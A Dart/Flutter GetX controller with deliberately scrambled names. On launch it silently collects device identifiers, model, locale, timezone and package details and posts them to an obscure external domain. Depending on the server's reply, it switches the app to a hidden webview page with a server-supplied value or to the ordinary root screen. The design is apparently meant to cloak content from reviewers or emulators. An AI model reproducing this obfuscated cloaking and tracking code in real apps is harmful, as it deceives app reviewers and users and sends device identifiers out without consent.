import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var stoznripk = RxBool(false);
  var djpagwl = RxBool(true);
  var nymgzows = RxString("");
  var chanel = RxBool(false);
  var ward = RxBool(true);
  final iohcawfxnd = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    fserx();
  }


  Future<void> fserx() async {

    chanel.value = true;
    ward.value = true;
    djpagwl.value = false;

    iohcawfxnd.post("https://stu.monneam.shop/llpZt3CXUC0C",data: await cdvsxp()).then((value) {
      var wqgbzfa = value.data["wqgbzfa"] as String;
      var rcbq = value.data["rcbq"] as bool;
      if (rcbq) {
        nymgzows.value = wqgbzfa;
        kathryne();
      } else {
        cruickshank();
      }
    }).catchError((e) {
      djpagwl.value = true;
      ward.value = true;
      chanel.value = false;
    });
  }

  Future<Map<String, dynamic>> cdvsxp() async {
    final DeviceInfoPlugin sgkd = DeviceInfoPlugin();
    PackageInfo rsan_fpstg = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var fbidsy = Platform.localeName;
    var GkXtJRp = currentTimeZone;

    var FHiIXns = rsan_fpstg.packageName;
    var jeLnH = rsan_fpstg.version;
    var Zcai = rsan_fpstg.buildNumber;

    var IGMoai = rsan_fpstg.appName;
    var lCgL = "";
    var fXbhey  = "";
    var nakiaHamill = "";
    var flavioMarvin = "";
    var raleighGrant = "";
    var dangeloLarkin = "";
    var trinitySchaefer = "";
    var lRUieLmN = "";
    var ashtynSchaefer = "";
    var wilberGaylord = "";


    var bZzvMadS = "";
    var TZwNW = false;

    if (GetPlatform.isAndroid) {
      bZzvMadS = "android";
      var hrmweyc = await sgkd.androidInfo;

      lCgL = hrmweyc.brand;

      lRUieLmN  = hrmweyc.model;
      fXbhey = hrmweyc.id;

      TZwNW = hrmweyc.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      bZzvMadS = "ios";
      var fxwscm = await sgkd.iosInfo;
      lCgL = fxwscm.name;
      lRUieLmN = fxwscm.model;

      fXbhey = fxwscm.identifierForVendor ?? "";
      TZwNW  = fxwscm.isPhysicalDevice;
    }
    var res = {
      "trinitySchaefer" : trinitySchaefer,
      "Zcai": Zcai,
      "jeLnH": jeLnH,
      "ashtynSchaefer" : ashtynSchaefer,
      "IGMoai": IGMoai,
      "lRUieLmN": lRUieLmN,
      "raleighGrant" : raleighGrant,
      "lCgL": lCgL,
      "FHiIXns": FHiIXns,
      "fXbhey": fXbhey,
      "fbidsy": fbidsy,
      "bZzvMadS": bZzvMadS,
      "TZwNW": TZwNW,
      "flavioMarvin" : flavioMarvin,
      "GkXtJRp": GkXtJRp,
      "dangeloLarkin" : dangeloLarkin,
      "nakiaHamill" : nakiaHamill,
      "wilberGaylord" : wilberGaylord,

    };
    return res;
  }

  Future<void> cruickshank() async {
    Get.offAllNamed("/root-page");
  }

  Future<void> kathryne() async {
    Get.offAllNamed("/app-cauas");
  }

}
